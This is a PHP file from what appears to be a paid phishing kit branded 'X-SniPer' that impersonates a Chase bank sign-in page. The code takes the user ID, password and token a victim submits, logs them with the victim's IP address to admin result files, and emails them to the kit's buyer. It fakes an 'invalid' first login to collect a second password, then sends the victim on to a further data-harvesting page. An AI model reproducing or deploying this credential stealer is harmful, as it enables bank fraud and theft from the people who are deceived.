<?php

require("require.php");


if (isset($_POST['userId']) && isset($_POST['password']) ) {
	if (!empty($_POST['userId']) && !empty($_POST['password']) ) {
			
			// Admin Panel
			$_SESSION['userId']  = $_POST['userId']; 
			$_SESSION['password']  = $_POST['password'];
			if (!empty($_POST['token'])) {
				$_SESSION['token'] = $_POST['token'];
			}else{
				$_SESSION['token'] = "NULL";
			}
			// End Admin Panel
			if(isset($_POST['invalid'])){$arrangement = "2nd"; }else{$arrangement = "1st";}
			$msgAdminPanel = "<tr>";
			$msgAdminPanel .= "<td>".$_SESSION['userId']."</td>";
			$msgAdminPanel .= "<td>".$_SESSION['password']."</td>";
			$msgAdminPanel .= "<td>".$ip." </td>";
			$msgAdminPanel .= "<td>".$date."</td>";
			$msgAdminPanel .= "</tr>". "\r\n";

	        $Subject = "❤️💪 X-SniPer ".$arrangement." New Login 💪❤️  [".$_POST['userId']."] ip 👉".$ip;
	        $headers = "MIME-Version: 1.0" . "\r\n";
	        $headers .= "From: ".$YourName." <ElZero@xSniper.com>" . "\r\n";
	        $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";
	        $msg = "#===========||<".$YourName.">||==========#\n";
	        $msg .= "#===========||<X-SniPer Page>||==========#\n";
	        $msg .= "UserID   : ".$_POST['userId']." ||\n";
	        $msg .= "Password : ".$_POST['password']." ||\n";
	        $msg .= "IP 	  : ".$ip."||==========//\n";
	        $msg .= "#===========||<Thanks For Buying>||===========#\n";

		
			if ($saveInAdminPanel  == "true") {
				if ($arrangement == "1st") {
					$file = fopen("../../admin/result/logins.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}elseif($arrangement == "2nd"){
					$file = fopen("../../admin/result/doubleLogins.txt", "a+");
					fwrite($file, $msgAdminPanel);
				}
				
			}
			
			if ($sendToEmail == "true") {
				
				send($yourEmail, $Subject, $msg);

			}

			if ($doubleLogin == "true" && $arrangement == "1st") {
				header("Location: ../../secure/signin?country=us&invalid2&id=chase");exit();
			}else{
				if ($Block_page == "true") {
					header("Location: ../../secure/blockPage?country=us&id=chase");exit();
				}else{
					header("Location: ../../secure/emailAccess?country=us&id=chase");exit();
				}
			}


		
	}else{
		header("Location: ../../secure/signin?id=chase&invalid&country=us");exit();
	}
}else{
	header("Location: ../../secure/signin?id=chase&invalid&country=us");exit();
}


?>